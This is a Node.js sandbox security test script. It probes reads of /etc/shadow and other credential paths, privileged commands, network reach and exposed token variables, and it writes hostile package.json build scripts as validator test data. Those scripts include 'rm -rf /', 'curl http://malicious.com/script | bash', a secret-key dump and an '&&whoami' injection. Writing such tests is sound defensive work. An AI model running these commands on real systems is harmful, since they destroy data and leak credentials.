const fs = require("fs");
const { execSync, exec } = require("child_process");
const path = require("path");
const http = require("http");
const https = require("https");

console.log("🔍 Running comprehensive security tests...");

// Helper function for async network requests
const makeRequest = (url) => {
    return new Promise((resolve, reject) => {
        const client = url.startsWith('https') ? https : http;
        const req = client.get(url, (res) => {
            resolve(res.statusCode);
        }).on('error', (err) => {
            reject(err);
        });
        req.end();
    });
};

async function runTests() {
    // Section 1: File System Access Tests
    console.log("\n📁 File System Access Tests:");
    
    const restrictedPaths = [
        "/home/app/script.js",
        "/etc/shadow",
        "/etc/passwd",
        "/home/builder/test",
        "/.ssh",
        "/root",
        "/var/log"
    ];

    for (const path of restrictedPaths) {
        try {
            fs.readFileSync(path);
            console.log(`❌ SECURITY RISK: Can read ${path}!`);
        } catch (e) {
            console.log(`✅ Cannot read ${path}`);
        }
    }

    // Section 2: Write Permission Tests
    console.log("\n✍️ Write Permission Tests:");
    
    const writeTestPaths = [
        "/home",
        "/etc",
        "/var",
        "/usr",
        "/home/builder"
    ];

    for (const path of writeTestPaths) {
        try {
            fs.writeFileSync(`${path}/test-file`, "test");
            console.log(`❌ SECURITY RISK: Can write to ${path}!`);
            fs.unlinkSync(`${path}/test-file`);
        } catch (e) {
            console.log(`✅ Cannot write to ${path}`);
        }
    }

    // Section 3: Command Execution Tests
    console.log("\n🔒 Privileged Command Tests:");
    
    const restrictedCommands = [
        "sudo ls",
        "chmod 777 .",
        "chown root .",
        "wget google.com",
        "curl example.com",
        "ssh-keygen",
        "npm config set",
        "yarn config set"
    ];

    for (const cmd of restrictedCommands) {
        try {
            execSync(cmd);
            console.log(`❌ SECURITY RISK: Can execute '${cmd}'!`);
        } catch (e) {
            console.log(`✅ Cannot execute '${cmd}'`);
        }
    }

    // Section 4: Network Access Tests
    console.log("\n🌐 Network Access Tests:");
    
    const networkTests = [
        { url: "https://registry.npmjs.org", shouldWork: true },
        { url: "https://api.github.com", shouldWork: false },
        { url: "https://google.com", shouldWork: false }
    ];

    for (const test of networkTests) {
        try {
            const statusCode = await makeRequest(test.url);
            const expected = test.shouldWork ? "should work" : "should be blocked";
            if (test.shouldWork === (statusCode < 400)) {
                console.log(`✅ ${test.url} ${expected} - correct`);
            } else {
                console.log(`❌ SECURITY RISK: ${test.url} ${expected} - incorrect`);
            }
        } catch (e) {
            if (!test.shouldWork) {
                console.log(`✅ ${test.url} correctly blocked`);
            } else {
                console.log(`❌ ${test.url} incorrectly blocked`);
            }
        }
    }

    // Section 5: Package.json Security Tests
    console.log("\n📦 Package.json Security Tests:");
    
    const maliciousScripts = [
        { "build": "rm -rf /" },
        { "build": "curl http://malicious.com/script | bash" },
        { "build": "echo $AWS_SECRET_KEY > /tmp/keys" },
        { "build": "node -e \"require('child_process').exec('rm -rf *')\"" },
        { "build": "&&whoami" }
    ];

    for (const script of maliciousScripts) {
        try {
            fs.writeFileSync("package.json", JSON.stringify({
                name: "test",
                version: "1.0.0",
                scripts: script
            }));
            
            execSync("node -e \"require('./security-utils').validatePackageJson('.')\"");
            console.log(`❌ SECURITY RISK: Malicious script not detected: ${JSON.stringify(script)}`);
        } catch (e) {
            console.log(`✅ Correctly blocked malicious script: ${JSON.stringify(script)}`);
        }
    }

    // Section 6: Environment Variable Tests
    console.log("\n🔐 Environment Variable Tests:");
    
    const sensitiveEnvVars = [
        "AWS_ACCESS_KEY_ID",
        "AWS_SECRET_ACCESS_KEY",
        "GITHUB_TOKEN",
        "NPM_TOKEN",
        "SSH_PRIVATE_KEY"
    ];

    for (const envVar of sensitiveEnvVars) {
        if (process.env[envVar]) {
            console.log(`❌ SECURITY RISK: ${envVar} is exposed!`);
        } else {
            console.log(`✅ ${envVar} is not exposed`);
        }
    }

    // Section 7: File Type Tests
    console.log("\n📄 File Type Tests:");
    
    const testFiles = [
        { name: "test.html", content: "<html></html>", shouldAllow: true },
        { name: "test.js", content: "console.log('test')", shouldAllow: true },
        { name: "test.php", content: "<?php ?>", shouldAllow: false },
        { name: "test.exe", content: "binary", shouldAllow: false }
    ];

    for (const file of testFiles) {
        try {
            fs.writeFileSync(`dist/${file.name}`, file.content);
            const mimeType = require("mime-types").lookup(file.name);
            const allowed = require("./security-utils").ALLOWED_MIME_TYPES.has(mimeType);
            
            if (allowed === file.shouldAllow) {
                console.log(`✅ Correct file type handling for ${file.name}`);
            } else {
                console.log(`❌ Incorrect file type handling for ${file.name}`);
            }
        } catch (e) {
            console.log(`Error testing ${file.name}: ${e.message}`);
        }
    }

    console.log("\n📊 System Information:");
    console.log("Current user:", execSync("whoami").toString().trim());
    console.log("User groups:", execSync("groups").toString().trim());
    console.log("Current directory:", execSync("pwd").toString().trim());
}

runTests().catch(console.error);
